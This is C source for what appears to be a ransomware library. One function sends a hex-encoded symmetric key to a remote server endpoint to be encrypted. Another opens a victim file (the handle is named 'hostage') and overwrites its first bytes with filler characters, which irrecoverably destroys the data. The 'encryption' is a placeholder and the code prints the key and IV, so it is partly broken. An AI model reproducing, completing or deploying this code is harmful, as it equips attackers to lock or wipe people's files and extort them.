#include "ransomlib.h"
#include "thirdparty/b64.h"
#include "weakcrypt.h"
#include "common.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

int encryptSymmetricKey(char** encrypted_key, const int pubkeyid, const char* key){
	//Get key in hex
	char* hexkey=b16encode(key,SYMMETRIC_KEY_SIZE);
	
	//Base url
	const char* base_url=SERVER_OSIR_HOME "/client-interface/encrypt.php";
	
	//Allocate memory for url
	char* url=(char*)malloc(sizeof(char)*(strlen(base_url)+2+strlen(hexkey)+strlen("?pubid=&symkey=")));
	
	//Make string from public key id
	char pki_string[5];
	itoa(pubkeyid,pki_string,10);
	
	//Make url
	strcpy(url,base_url);
	strcat(url,"?keyid=");
	strcat(url,pki_string);
	strcat(url,"&symkey=");
	strcat(url,hexkey);
	strcat(url,"\0");
	
	//Get encrypted key
	int ret=decryptRemoteBytes(encrypted_key,url);
	
	//Deallocate memory and return encrypted key size
	free(url);
	free(hexkey);
	return ret;
}

bool partialEncryptFile(const char* key,const char* iv, const char* filename, int64_t number_of_bytes){
	printf("%s%s",key,iv);
	FILE* hostage=fopen(filename,"rb");
	if(hostage==NULL){
		fprintf(stderr,"Error: partialEncryptFile: cannot open file\n");
		return 0;
	}
	
	//Get file size
	fseek(hostage,0,SEEK_END);
	int64_t file_size=ftell(hostage);
	fseek(hostage,0,SEEK_SET);
	
	//Restrain number_of_bytes to file size
	number_of_bytes=file_size>number_of_bytes?number_of_bytes:file_size;
	
	//Read bytes for encryption
	char* plaintext=(char*)malloc(sizeof(char)*number_of_bytes);
	fread(plaintext,1,number_of_bytes,hostage);
	
	//Encrypt bytes
	char* ciphertext=(char*)malloc(sizeof(char)*number_of_bytes+1);
	if(ciphertext==NULL)
		fprintf(stderr,"Warning: partialEncryptFile: memory allocation problem\n");
	for(int64_t i=0;i<number_of_bytes;i++){
		ciphertext[i]='j';
	}
	
	
	//Close then open to write
	fclose(hostage);
	hostage=fopen(filename,"r+b");
	
	//Write bytes
	if(fwrite(ciphertext,1,number_of_bytes,hostage)!=(unsigned long)number_of_bytes){
		fprintf(stderr,"Error: partialEncryptFile: writing failed\n");
		return 0;
	}
	
	//cleanup
	fclose(hostage);
	free(plaintext);
	free(ciphertext);
	return 1;
	
}